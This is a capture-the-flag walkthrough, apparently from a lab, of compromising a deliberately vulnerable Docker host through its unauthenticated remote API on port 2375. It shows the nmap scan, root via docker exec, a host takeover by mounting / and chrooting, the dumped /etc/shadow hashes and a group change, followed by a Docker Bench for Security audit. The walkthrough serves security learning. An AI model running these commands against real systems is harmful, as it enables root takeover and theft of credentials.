+Step 1. Scanning & Enumeration (Nmap + Docker client)
+=======================================================================================================
+
+
+jeff@kali-Linux:~/Documents/CTFs/Docker$ sudo nmap -sS -sV -sC -v -p- 192.168.1.9 
+<SNIP>
+Initiating SYN Stealth Scan at 23:17
+Scanning 192.168.1.9 [65535 ports]
+Discovered open port 22/tcp on 192.168.1.9
+Discovered open port 2375/tcp on 192.168.1.9
+<SNIP>
+Nmap scan report for 192.168.1.9
+Host is up (0.012s latency).
+Not shown: 65533 closed ports
+
+PORT     STATE SERVICE VERSION
+
+22/tcp   open  ssh     OpenSSH 6.6p1 Ubuntu 2ubuntu1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 45:13:08:81:70:6d:46:c3:50:ed:3c:ab:ae:d6:e1:85 (DSA)
+|   2048 4c:e7:2b:01:52:16:1d:5c:6b:09:9d:3d:4b:bb:79:90 (RSA)
+|_  256 cc:2f:62:71:4c:ea:6c:a6:d8:a7:4f:eb:82:2a:22:ba (ECDSA)
+
+2375/tcp open  docker  Docker 17.06.0-ce
+| docker-version: 
+|   GoVersion: go1.8.3
+|   Os: linux
+|   Arch: amd64
+|   ApiVersion: 1.30
+|   GitCommit: 02c1d87
+|   MinAPIVersion: 1.12
+|   KernelVersion: 3.13.0-128-generic
+|   BuildTime: 2017-06-23T21:17:13.228983331+00:00
+|_  Version: 17.06.0-ce
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 404 Not Found
+|     Content-Type: application/json
+|     Date: Thu, 09 Apr 2020 21:18:45 GMT
+|     Content-Length: 29
+|     {"message":"page not found"}
+|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 404 Not Found
+|     Content-Type: application/json
+|     Date: Thu, 09 Apr 2020 21:18:19 GMT
+|     Content-Length: 29
+|     {"message":"page not found"}
+|   HTTPOptions: 
+|     HTTP/1.0 200 OK
+|     Api-Version: 1.30
+|     Docker-Experimental: false
+|     Ostype: linux
+|     Server: Docker/17.06.0-ce (linux)
+|     Date: Thu, 09 Apr 2020 21:18:19 GMT
+|     Content-Length: 0
+|     Content-Type: text/plain; charset=utf-8
+|   docker: 
+|     HTTP/1.1 400 Bad Request: missing required Host header
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|_    Request: missing required Host header
+
+MAC Address: F4:5C:89:C9:BE:C5 (Apple)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+Enumerate information regarding the configuration of docker
+=============================================================
+
+jeff@kali-Linux:~/Documents/CTFs/Docker$ docker -H tcp://192.168.1.9:2375 info
+Client:
+ Debug Mode: false
+
+Server:
+ Containers: 3
+  Running: 2
+  Paused: 0
+  Stopped: 1
+ Images: 3
+ Server Version: 17.06.0-ce
+ Storage Driver: aufs
+  Root Dir: /var/lib/docker/aufs
+  Backing Filesystem: extfs
+  Dirs: 38
+  Dirperm1 Supported: false
+ Logging Driver: json-file
+ Cgroup Driver: cgroupfs
+ Plugins:
+  Volume: local
+  Network: bridge host macvlan null overlay
+  Log: awslogs fluentd gcplogs gelf journald json-file logentries splunk syslog
+ Swarm: inactive
+ Runtimes: runc
+ Default Runtime: runc
+ Init Binary: docker-init
+ containerd version: cfb82a876ecc11b5ca0977d1733adbe58599088a
+ runc version: 2d41c047c83e09a6d61d464906feb2a2f3c52aa4
+ init version: 949e6fa
+ Security Options:
+  apparmor
+ Kernel Version: 3.13.0-128-generic
+ Operating System: Ubuntu 14.04 LTS
+ OSType: linux
+ Architecture: x86_64
+ CPUs: 1
+ Total Memory: 993.9MiB
+ Name: vulndocker
+ ID: GLP6:OT5L:SYVE:BX54:BVOU:BQQ3:CQID:KXTQ:ERTV:4JH6:QL7T:OTLL
+ Docker Root Dir: /var/lib/docker
+ Debug Mode: false
+ Registry: https://index.docker.io/v1/
+ Experimental: false
+ Insecure Registries:
+  127.0.0.0/8
+ Live Restore Enabled: false
+
+WARNING: No swap limit support
+
+
+jeff@kali-Linux:~/Documents/CTFs/Docker$ docker -H tcp://192.168.1.9:2375 ps
+CONTAINER ID        IMAGE                      COMMAND                  CREATED             STATUS                          PORTS                  NAMES
+8f4bca8ef241        wordpress:latest           "docker-entrypoint.s…"   2 years ago         Up 6 seconds                    0.0.0.0:8000->80/tcp   content_wordpress_1
+13f0a3bb2706        mysql:5.7                  "docker-entrypoint.s…"   2 years ago         Restarting (1) 45 seconds ago                          content_db_1
+b90babce1037        jeroenpeeters/docker-ssh   "npm start"              2 years ago         Up 36 minutes                   22/tcp, 8022/tcp       content_ssh_1
+
+
+jeff@kali-Linux:~/Documents/CTFs/Docker$ docker -H tcp://192.168.1.9:2375 image ls
+REPOSITORY                 TAG                 IMAGE ID            CREATED             SIZE
+wordpress                  latest              c4260b289fc7        2 years ago         406MB
+mysql                      5.7                 c73c7527c03a        2 years ago         412MB
+jeroenpeeters/docker-ssh   latest              7d3ecb48134e        2 years ago         43.2MB
+
+
+jeff@kali-Linux:~/Documents/CTFs/Docker$ docker -H tcp://192.168.1.9:2375 network ls
+NETWORK ID          NAME                DRIVER              SCOPE
+192a9d8af757        bridge              bridge              local
+19017deceb88        content_default     bridge              local
+e59e8190c373        host                host                local
+695bf0a5f54f        none                null                local
+
+
+jeff@kali-Linux:~/Documents/CTFs/Docker$ docker -H tcp://192.168.1.9:2375 network inspect content_default
+[
+    {
+        "Name": "content_default",
+        "Id": "19017deceb88f158f543b160620c380ebcc681924b94b4eafb4e73fe3b7b9a70",
+        "Created": "2017-08-16T18:27:20.828213539+01:00",
+        "Scope": "local",
+        "Driver": "bridge",
+        "EnableIPv6": false,
+        "IPAM": {
+            "Driver": "default",
+            "Options": null,
+            "Config": [
+                {
+                    "Subnet": "172.18.0.0/16",
+                    "Gateway": "172.18.0.1"
+                }
+            ]
+        },
+        "Internal": false,
+        "Attachable": false,
+        "Ingress": false,
+        "ConfigFrom": {
+            "Network": ""
+        },
+        "ConfigOnly": false,
+        "Containers": {
+            "8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669": {
+                "Name": "content_wordpress_1",
+                "EndpointID": "5a0cf4431d5b89480303c67ae703ca3400df1ef78088f291c1b9b551eaea58fa",
+                "MacAddress": "02:42:ac:12:00:02",
+                "IPv4Address": "172.18.0.2/16",
+                "IPv6Address": ""
+            },
+            "b90babce10373b0d226169d8ccaa256aaf457fa70d6f392159ae8e331f967106": {
+                "Name": "content_ssh_1",
+                "EndpointID": "287a3a0fb1b5149818eb7c470c3ae79126a8db4e8be63cc02cee2e80107d37df",
+                "MacAddress": "02:42:ac:12:00:04",
+                "IPv4Address": "172.18.0.4/16",
+                "IPv6Address": ""
+            }
+        },
+        "Options": {},
+        "Labels": {}
+    }
+]
+
+
+=======================================================================================================
+Step 2. Gaining access and Privilege escalation to become Root
+=======================================================================================================
+
+
+=> Use 'docker exec -it' commands to run commands as root on all 3 docker containers (Wordpress, mysql and docker-ssh)
+-----------------------------------------------------------------------------------------------------------------------
+
+jeff@kali-Linux:~/Documents/CTFs/Docker$ docker -H tcp://192.168.1.9:2375 ps
+CONTAINER ID        IMAGE                      COMMAND                  CREATED             STATUS                          PORTS                  NAMES
+8f4bca8ef241        wordpress:latest           "docker-entrypoint.s…"   2 years ago         Up 6 seconds                    0.0.0.0:8000->80/tcp   content_wordpress_1
+13f0a3bb2706        mysql:5.7                  "docker-entrypoint.s…"   2 years ago         Restarting (1) 45 seconds ago                          content_db_1
+b90babce1037        jeroenpeeters/docker-ssh   "npm start"              2 years ago         Up 36 minutes                   22/tcp, 8022/tcp       content_ssh_1
+
+
+jeff@kali-Linux:~/Documents/CTFs/Docker$ docker -H tcp://192.168.1.9:2375 exec -it 8f4bca8ef241 id
+uid=0(root) gid=0(root) groups=0(root)
+
+jeff@kali-Linux:~/Documents/CTFs/Docker$ docker -H tcp://192.168.1.9:2375 exec -it 13f0a3bb2706 id
+Error response from daemon: Container 13f0a3bb27069c58d328761a5202423bee3cdcdade0dfd4a9648d30d3ac20215 is restarting, wait until the container is running
+
+jeff@kali-Linux:~/Documents/CTFs/Docker$ docker -H tcp://192.168.1.9:2375 exec -it b90babce1037 id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+
+
+
+=> Take over the Linux server hosting the docker containers by running a Wordpress container with a volume pointing to the root folder of the hosting server
+-------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+jeff@kali-Linux:~/Documents/CTFs/Docker$ docker -H tcp://192.168.1.9:2375 run --rm -it -v /:/host wordpress chroot /host bash
+
+root@ad97315a004a:/# 
+
+root@ad97315a004a:/# hostname
+ad97315a004a
+
+root@ad97315a004a:/# cat /etc/shadow
+root:$6$i8GUrrmW$GE/x1EEwKgMvvTS0IuOfd4jkrP9ufQrYxBdvAXh72ETmC.PZv.0gzb9Fxfs2y5CxmKiJlRUJVr5p0k3TxgPEG0:17394:0:99999:7:::
+daemon:*:16176:0:99999:7:::
+bin:*:16176:0:99999:7:::
+sys:*:16176:0:99999:7:::
+sync:*:16176:0:99999:7:::
+games:*:16176:0:99999:7:::
+man:*:16176:0:99999:7:::
+lp:*:16176:0:99999:7:::
+mail:*:16176:0:99999:7:::
+news:*:16176:0:99999:7:::
+uucp:*:16176:0:99999:7:::
+proxy:*:16176:0:99999:7:::
+www-data:*:16176:0:99999:7:::
+backup:*:16176:0:99999:7:::
+list:*:16176:0:99999:7:::
+irc:*:16176:0:99999:7:::
+gnats:*:16176:0:99999:7:::
+nobody:*:16176:0:99999:7:::
+libuuid:!:16176:0:99999:7:::
+syslog:*:16176:0:99999:7:::
+messagebus:*:17392:0:99999:7:::
+landscape:*:17392:0:99999:7:::
+sshd:*:17392:0:99999:7:::
+whale:$6$RvS0tNRs$gV2mxTeBwobOo9h1LZ59aGb1Gy7E83.2Lb5IsmPupTKxLqfoLAMLAKPMskQ1s52puOQoXzuLhrhM.j7TkTAxp1:17394:0:99999:7:::
+pentester:$6$AgW5CdCG$EnD.tXvPpdUOmveyIKp2EkjMWTBfUEnQGLOhO73uynxtiKf05NGJERcgUdK0SrkT6Vk14Gzvg4reylavveq6a.:18360:0:99999:7:::
+root@ad97315a004a:/# 
+
+
+=> We can see the account 'pentester' that I created on the Linux server "vulndocker" while doing the 'hard' mode challenge.
+
+
+=> Let's add this account to the docker group, then log into the Linux server and run the tool 'Docker Bench for Security' that checks for dozens of common best-practices around deploying Docker containers in production (https://github.com/docker/docker-bench-security)
+
+
+root@a36236870810:/# usermod -a -G docker pentester
+
+root@a36236870810:/# cat /etc/group
+root:x:0:
+daemon:x:1:
+bin:x:2:
+sys:x:3:
+adm:x:4:syslog
+<SNIP>
+whale:x:1001:
+docker:x:999:pentester
+pentester:x:1002:
+<SNIP>
+
+
+jeff@kali-Linux:~/Documents/CTFs/Docker$ wget https://github.com/docker/docker-bench-security/archive/master.zip
+
+--2020-04-10 00:54:17--  https://github.com/docker/docker-bench-security/archive/master.zip
+Resolving github.com (github.com)... 140.82.118.3
+Connecting to github.com (github.com)|140.82.118.3|:443... connected.
+HTTP request sent, awaiting response... 302 Found
+Location: https://codeload.github.com/docker/docker-bench-security/zip/master [following]
+--2020-04-10 00:54:18--  https://codeload.github.com/docker/docker-bench-security/zip/master
+Resolving codeload.github.com (codeload.github.com)... 140.82.112.10
+Connecting to codeload.github.com (codeload.github.com)|140.82.112.10|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: unspecified [application/zip]
+Saving to: ‘master.zip’
+
+master.zip                                             [  <=>                                                                                                          ] 281.84K   806KB/s    in 0.3s    
+
+2020-04-10 00:54:18 (806 KB/s) - ‘master.zip’ saved [288602]
+
+
+jeff@kali-Linux:~/Documents/CTFs/Docker$ scp master.zip pentester@192.168.1.9:/tmp/
+pentester@192.168.1.9's password: 
+Could not chdir to home directory /home/pentester: No such file or directory
+master.zip 
+
+
+
+jeff@kali-Linux:~/Documents/CTFs/Docker$ ssh pentester@192.168.1.9
+pentester@192.168.1.9's password: 
+
+Welcome to Ubuntu 14.04 LTS (GNU/Linux 3.13.0-128-generic x86_64)
+
+$ bash
+pentester@vulndocker:/$ cd /tmp/
+
+pentester@vulndocker:/tmp$ ls -al
+total 292
+drwxrwxrwt  2 root      root        4096 Apr  9 23:55 .
+drwxr-xr-x 22 root      root        4096 Aug 22  2017 ..
+-rw-r--r--  1 pentester pentester 288602 Apr  9 23:55 master.zip
+
+pentester@vulndocker:/tmp$ unzip master.zip 
+The program 'unzip' is currently not installed. To run 'unzip' please ask your administrator to install the package 'unzip'
+
+pentester@vulndocker:/tmp$ docker run --rm -it -v /:/host wordpress chroot /host bash
+
+root@cb3f5624c6c9:/# apt-get install unzip
+Reading package lists... Done
+Building dependency tree       
+Reading state information... Done
+Suggested packages:
+  zip
+The following NEW packages will be installed:
+  unzip
+0 upgraded, 1 newly installed, 0 to remove and 213 not upgraded.
+Need to get 157 kB of archives.
+After this operation, 395 kB of additional disk space will be used.
+Get:1 http://gb.archive.ubuntu.com/ubuntu/ trusty-updates/main unzip amd64 6.0-9ubuntu1.5 [157 kB]
+Fetched 157 kB in 0s (2022 kB/s)
+Selecting previously unselected package unzip.
+(Reading database ... 61125 files and directories currently installed.)
+Preparing to unpack .../unzip_6.0-9ubuntu1.5_amd64.deb ...
+Unpacking unzip (6.0-9ubuntu1.5) ...
+Processing triggers for man-db (2.6.7.1-1) ...
+Processing triggers for mime-support (3.54ubuntu1) ...
+Setting up unzip (6.0-9ubuntu1.5) ...
+
+root@cb3f5624c6c9:/# exit
+exit
+
+exit
+pentester@vulndocker:/tmp$ unzip master.zip 
+Archive:  master.zip
+0307da4c612cc59ee44ac79c8eb0a5a3f84ead8c
+   creating: docker-bench-security-master/
+ extracting: docker-bench-security-master/.dockerignore  
+ extracting: docker-bench-security-master/.gitignore  
+  inflating: docker-bench-security-master/CONTRIBUTING.md  
+  inflating: docker-bench-security-master/CONTRIBUTORS.md  
+  inflating: docker-bench-security-master/Dockerfile  
+  inflating: docker-bench-security-master/LICENSE.md  
+  inflating: docker-bench-security-master/MAINTAINERS  
+  inflating: docker-bench-security-master/README.md  
+  inflating: docker-bench-security-master/benchmark_log.png  
+   creating: docker-bench-security-master/distros/
+  inflating: docker-bench-security-master/distros/Dockerfile.alpine  
+  inflating: docker-bench-security-master/distros/Dockerfile.centos  
+  inflating: docker-bench-security-master/distros/Dockerfile.debian  
+  inflating: docker-bench-security-master/distros/Dockerfile.openSUSE  
+  inflating: docker-bench-security-master/distros/Dockerfile.rhel  
+  inflating: docker-bench-security-master/distros/README.md  
+  inflating: docker-bench-security-master/docker-bench-security.sh  
+  inflating: docker-bench-security-master/docker-compose.yml  
+  inflating: docker-bench-security-master/functions_lib.sh  
+  inflating: docker-bench-security-master/helper_lib.sh  
+  inflating: docker-bench-security-master/output_lib.sh  
+   creating: docker-bench-security-master/tests/
+  inflating: docker-bench-security-master/tests/1_host_configuration.sh  
+  inflating: docker-bench-security-master/tests/2_docker_daemon_configuration.sh  
+  inflating: docker-bench-security-master/tests/3_docker_daemon_configuration_files.sh  
+  inflating: docker-bench-security-master/tests/4_container_images.sh  
+  inflating: docker-bench-security-master/tests/5_container_runtime.sh  
+  inflating: docker-bench-security-master/tests/6_docker_security_operations.sh  
+  inflating: docker-bench-security-master/tests/7_docker_swarm_configuration.sh  
+  inflating: docker-bench-security-master/tests/8_docker_enterprise_configuration.sh  
+  inflating: docker-bench-security-master/tests/99_community_checks.sh  
+
+pentester@vulndocker:/tmp$ ls
+docker-bench-security-master  master.zip
+
+pentester@vulndocker:/tmp$ cd docker-bench-security-master/
+
+pentester@vulndocker:/tmp/docker-bench-security-master$ ls
+benchmark_log.png  CONTRIBUTORS.md  docker-bench-security.sh  Dockerfile	helper_lib.sh  MAINTAINERS    README.md
+CONTRIBUTING.md    distros	    docker-compose.yml	      functions_lib.sh	LICENSE.md     output_lib.sh  tests
+
+
+pentester@vulndocker:/tmp/docker-bench-security-master$ ./docker-bench-security.sh -h
+  usage: docker-bench-security.sh [options]
+
+  -b           optional  Do not print colors
+  -h           optional  Print this help message
+  -l FILE      optional  Log output in FILE
+  -c CHECK     optional  Comma delimited list of specific check(s)
+  -e CHECK     optional  Comma delimited list of specific check(s) to exclude
+  -i INCLUDE   optional  Comma delimited list of patterns within a container or image name to check
+  -x EXCLUDE   optional  Comma delimited list of patterns within a container or image name to exclude from check
+
+
+pentester@vulndocker:/tmp/docker-bench-security-master$ ./docker-bench-security.sh 
+
+# ------------------------------------------------------------------------------
+# Docker Bench for Security v1.3.5
+#
+# Docker, Inc. (c) 2015-
+#
+# Checks for dozens of common best-practices around deploying Docker containers in production.
+# Inspired by the CIS Docker Benchmark v1.2.0.
+# ------------------------------------------------------------------------------
+
+[WARN] Some tests might require root to run
+Initializing Thu Apr  9 23:59:22 BST 2020
+
+
+[INFO] 1 - Host Configuration
+
+[INFO] 1.1 - General Configuration
+[NOTE] 1.1.1  - Ensure the container host has been Hardened
+[INFO] 1.1.2  - Ensure Docker is up to date
+[INFO]        * Using 17.06.0, verify is it up to date as deemed necessary
+[INFO]        * Your operating system vendor may provide support and security maintenance for Docker
+
+[INFO] 1.2 - Linux Hosts Specific Configuration
+[WARN] 1.2.1 - Ensure a separate partition for containers has been created
+[INFO] 1.2.2  - Ensure only trusted users are allowed to control Docker daemon
+[INFO]        * docker:x:999:pentester
+[WARN] 1.2.3  - Ensure auditing is configured for the Docker daemon
+[WARN] 1.2.4  - Ensure auditing is configured for Docker files and directories - /var/lib/docker
+[WARN] 1.2.5  - Ensure auditing is configured for Docker files and directories - /etc/docker
+[INFO] 1.2.6  - Ensure auditing is configured for Docker files and directories - docker.service
+[INFO]        * File not found
+[INFO] 1.2.7  - Ensure auditing is configured for Docker files and directories - docker.socket
+[INFO]        * File not found
+[WARN] 1.2.8  - Ensure auditing is configured for Docker files and directories - /etc/default/docker
+[INFO] 1.2.9  - Ensure auditing is configured for Docker files and directories - /etc/sysconfig/docker
+[INFO]        * File not found
+[INFO] 1.2.10  - Ensure auditing is configured for Docker files and directories - /etc/docker/daemon.json
+[INFO]         * File not found
+[INFO] 1.2.11  - Ensure auditing is configured for Docker files and directories - /usr/bin/containerd
+[INFO]         * File not found
+[INFO] 1.2.12  - Ensure auditing is configured for Docker files and directories - /usr/sbin/runc
+[INFO]         * File not found
+
+
+[INFO] 2 - Docker daemon configuration
+[WARN] 2.1  - Ensure network traffic is restricted between containers on the default bridge
+[PASS] 2.2  - Ensure the logging level is set to 'info'
+[PASS] 2.3  - Ensure Docker is allowed to make changes to iptables
+[PASS] 2.4  - Ensure insecure registries are not used
+[PASS] 2.5  - Ensure aufs storage driver is not used
+[INFO] 2.6  - Ensure TLS authentication for Docker daemon is configured
+[INFO]      * Docker daemon not listening on TCP
+[INFO] 2.7  - Ensure the default ulimit is configured appropriately
+[INFO]      * Default ulimit doesn't appear to be set
+[WARN] 2.8  - Enable user namespace support
+[PASS] 2.9  - Ensure the default cgroup usage has been confirmed
+[PASS] 2.10  - Ensure base device size is not changed until needed
+[WARN] 2.11  - Ensure that authorization for Docker client commands is enabled
+[WARN] 2.12  - Ensure centralized and remote logging is configured
+[WARN] 2.13  - Ensure live restore is Enabled
+[WARN] 2.14  - Ensure Userland Proxy is Disabled
+[INFO] 2.15  - Ensure that a daemon-wide custom seccomp profile is applied if appropriate
+[PASS] 2.16  - Ensure that experimental features are not implemented in production
+[WARN] 2.17  - Ensure containers are restricted from acquiring new privileges
+
+
+[INFO] 3 - Docker daemon configuration files
+[INFO] 3.1  - Ensure that docker.service file ownership is set to root:root
+[INFO]      * File not found
+[INFO] 3.2  - Ensure that docker.service file permissions are appropriately set
+[INFO]      * File not found
+[INFO] 3.3  - Ensure that docker.socket file ownership is set to root:root
+[INFO]      * File not found
+[INFO] 3.4  - Ensure that docker.socket file permissions are set to 644 or more restrictive
+[INFO]      * File not found
+[PASS] 3.5  - Ensure that /etc/docker directory ownership is set to root:root
+[PASS] 3.6  - Ensure that /etc/docker directory permissions are set to 755 or more restrictive
+[INFO] 3.7  - Ensure that registry certificate file ownership is set to root:root
+[INFO]      * Directory not found
+[INFO] 3.8  - Ensure that registry certificate file permissions are set to 444 or more restrictive
+[INFO]      * Directory not found
+[INFO] 3.9  - Ensure that TLS CA certificate file ownership is set to root:root
+[INFO]      * No TLS CA certificate found
+[INFO] 3.10  - Ensure that TLS CA certificate file permissions are set to 444 or more restrictive
+[INFO]       * No TLS CA certificate found
+[INFO] 3.11  - Ensure that Docker server certificate file ownership is set to root:root
+[INFO]       * No TLS Server certificate found
+[INFO] 3.12  - Ensure that Docker server certificate file permissions are set to 444 or more restrictive
+[INFO]       * No TLS Server certificate found
+[INFO] 3.13  - Ensure that Docker server certificate key file ownership is set to root:root
+[INFO]       * No TLS Key found
+[INFO] 3.14  - Ensure that Docker server certificate key file permissions are set to 400
+[INFO]       * No TLS Key found
+[PASS] 3.15  - Ensure that Docker socket file ownership is set to root:docker
+[PASS] 3.16  - Ensure that Docker socket file permissions are set to 660 or more restrictive
+[INFO] 3.17  - Ensure that daemon.json file ownership is set to root:root
+[INFO]       * File not found
+[INFO] 3.18  - Ensure that daemon.json file permissions are set to 644 or more restrictive
+[INFO]       * File not found
+[PASS] 3.19  - Ensure that /etc/default/docker file ownership is set to root:root
+[INFO] 3.20  - Ensure that the /etc/sysconfig/docker file ownership is set to root:root
+[INFO]       * File not found
+[INFO] 3.21  - Ensure that /etc/sysconfig/docker file permissions are set to 644 or more restrictive
+[INFO]       * File not found
+[PASS] 3.22  - Ensure that /etc/default/docker file permissions are set to 644 or more restrictive
+
+
+[INFO] 4 - Container Images and Build File
+[WARN] 4.1  - Ensure a user for the container has been created
+[WARN]      * Running as root: content_wordpress_1
+[WARN]      * Running as root: content_db_1
+[WARN]      * Running as root: content_ssh_1
+[NOTE] 4.2  - Ensure that containers use only trusted base images
+[NOTE] 4.3  - Ensure that unnecessary packages are not installed in the container
+[NOTE] 4.4  - Ensure images are scanned and rebuilt to include security patches
+[WARN] 4.5  - Ensure Content trust for Docker is Enabled
+[WARN] 4.6  - Ensure that HEALTHCHECK instructions have been added to container images
+[WARN]      * No Healthcheck found: [wordpress:latest]
+[WARN]      * No Healthcheck found: [mysql:5.7]
+[WARN]      * No Healthcheck found: [jeroenpeeters/docker-ssh:latest]
+[INFO] 4.7  - Ensure update instructions are not use alone in the Dockerfile
+[INFO]      * Update instruction found: [wordpress:latest]
+[INFO]      * Update instruction found: [mysql:5.7]
+[INFO]      * Update instruction found: [jeroenpeeters/docker-ssh:latest]
+[NOTE] 4.8  - Ensure setuid and setgid permissions are removed
+[INFO] 4.9  - Ensure that COPY is used instead of ADD in Dockerfiles
+[INFO]      * ADD in image history: [jeroenpeeters/docker-ssh:latest]
+[NOTE] 4.10  - Ensure secrets are not stored in Dockerfiles
+[NOTE] 4.11  - Ensure only verified packages are installed
+
+
+[INFO] 5 - Container Runtime
+[PASS] 5.1  - Ensure that, if applicable, an AppArmor Profile is enabled 
+[WARN] 5.2  - Ensure that, if applicable, SELinux security options are set
+[WARN]      * No SecurityOptions Found: content_wordpress_1
+[WARN]      * No SecurityOptions Found: content_db_1
+[WARN]      * No SecurityOptions Found: content_ssh_1
+[PASS] 5.3  - Ensure Linux Kernel Capabilities are restricted within containers
+[PASS] 5.4  - Ensure that privileged containers are not used
+[PASS] 5.5  - Ensure sensitive host system directories are not mounted on containers
+[PASS] 5.6  - Ensure sshd is not run within containers
+[PASS] 5.7  - Ensure privileged ports are not mapped within containers
+[NOTE] 5.8  - Ensure that only needed ports are open on the container
+[PASS] 5.9  - Ensure the host's network namespace is not shared
+[WARN] 5.10  - Ensure that the memory usage for containers is limited
+[WARN]      * Container running without memory restrictions: content_wordpress_1
+[WARN]      * Container running without memory restrictions: content_db_1
+[WARN]      * Container running without memory restrictions: content_ssh_1
+[WARN] 5.11  - Ensure CPU priority is set appropriately on the container
+[WARN]      * Container running without CPU restrictions: content_wordpress_1
+[WARN]      * Container running without CPU restrictions: content_db_1
+[WARN]      * Container running without CPU restrictions: content_ssh_1
+[WARN] 5.12  - Ensure that the container's root filesystem is mounted as read only
+[WARN]      * Container running with root FS mounted R/W: content_wordpress_1
+[WARN]      * Container running with root FS mounted R/W: content_db_1
+[WARN]      * Container running with root FS mounted R/W: content_ssh_1
+[WARN] 5.13  - Ensure that incoming container traffic is bound to a specific host interface
+[WARN]      * Port being bound to wildcard IP: 0.0.0.0 in content_wordpress_1
+[WARN] 5.14  - Ensure that the 'on-failure' container restart policy is set to '5'
+[WARN]      * MaximumRetryCount is not set to 5: content_wordpress_1
+[WARN]      * MaximumRetryCount is not set to 5: content_db_1
+[WARN]      * MaximumRetryCount is not set to 5: content_ssh_1
+[PASS] 5.15  - Ensure the host's process namespace is not shared
+[PASS] 5.16  - Ensure the host's IPC namespace is not shared
+[PASS] 5.17  - Ensure that host devices are not directly exposed to containers
+[INFO] 5.18  - Ensure that the default ulimit is overwritten at runtime if needed
+[INFO]      * Container no default ulimit override: content_wordpress_1
+[INFO]      * Container no default ulimit override: content_db_1
+[INFO]      * Container no default ulimit override: content_ssh_1
+[PASS] 5.19  - Ensure mount propagation mode is not set to shared
+[PASS] 5.20  - Ensure the host's UTS namespace is not shared
+[PASS] 5.21  - Ensure the default seccomp profile is not Disabled
+[NOTE] 5.22  - Ensure docker exec commands are not used with privileged option
+[NOTE] 5.23  - Ensure that docker exec commands are not used with the user=root option
+[PASS] 5.24  - Ensure that cgroup usage is confirmed
+[WARN] 5.25  - Ensure that the container is restricted from acquiring additional privileges
+[WARN]      * Privileges not restricted: content_wordpress_1
+[WARN]      * Privileges not restricted: content_db_1
+[WARN]      * Privileges not restricted: content_ssh_1
+[WARN] 5.26  - Ensure that container health is checked at runtime
+[WARN]      * Health check not set: content_wordpress_1
+[WARN]      * Health check not set: content_db_1
+[WARN]      * Health check not set: content_ssh_1
+[INFO] 5.27  - Ensure that Docker commands always make use of the latest version of their image
+[WARN] 5.28  - Ensure that the PIDs cgroup limit is used
+[WARN]      * PIDs limit not set: content_wordpress_1
+[WARN]      * PIDs limit not set: content_db_1
+[WARN]      * PIDs limit not set: content_ssh_1
+[PASS] 5.29  - Ensure that Docker's default bridge 'docker0' is not used
+[PASS] 5.30  - Ensure that the host's user namespaces are not shared
+[WARN] 5.31  - Ensure that the Docker socket is not mounted inside any containers
+[WARN]      * Docker socket shared: content_db_1
+[WARN]      * Docker socket shared: content_ssh_1
+
+
+[INFO] 6 - Docker Security Operations
+[INFO] 6.1  - Ensure that image sprawl is avoided
+[INFO]      * There are currently: 3 images
+[INFO] 6.2  - Ensure that container sprawl is avoided
+[INFO]      * There are currently a total of 3 containers, with 3 of them currently running
+
+
+[INFO] 7 - Docker Swarm Configuration
+[PASS] 7.1  - Ensure swarm mode is not Enabled, if not needed
+[PASS] 7.2  - Ensure that the minimum number of manager nodes have been created in a swarm (Swarm mode not enabled)
+[PASS] 7.3  - Ensure that swarm services are bound to a specific host interface (Swarm mode not enabled)
+[PASS] 7.4  - Ensure that all Docker swarm overlay networks are encrypted
+[PASS] 7.5  - Ensure that Docker's secret management commands are used for managing secrets in a swarm cluster (Swarm mode not enabled)
+[PASS] 7.6  - Ensure that swarm manager is run in auto-lock mode (Swarm mode not enabled)
+[PASS] 7.7  - Ensure that the swarm manager auto-lock key is rotated periodically (Swarm mode not enabled)
+[PASS] 7.8  - Ensure that node certificates are rotated as appropriate (Swarm mode not enabled)
+[PASS] 7.9  - Ensure that CA certificates are rotated as appropriate (Swarm mode not enabled)
+[PASS] 7.10  - Ensure that management plane traffic is separated from data plane traffic (Swarm mode not enabled)
+
+
+[INFO] 8 - Docker Enterprise Configuration
+[INFO]   * Community Engine license, skipping section 8
+
+[INFO] Checks: 107
+[INFO] Score: 13
+
+pentester@vulndocker:/tmp/docker-bench-security-master$  
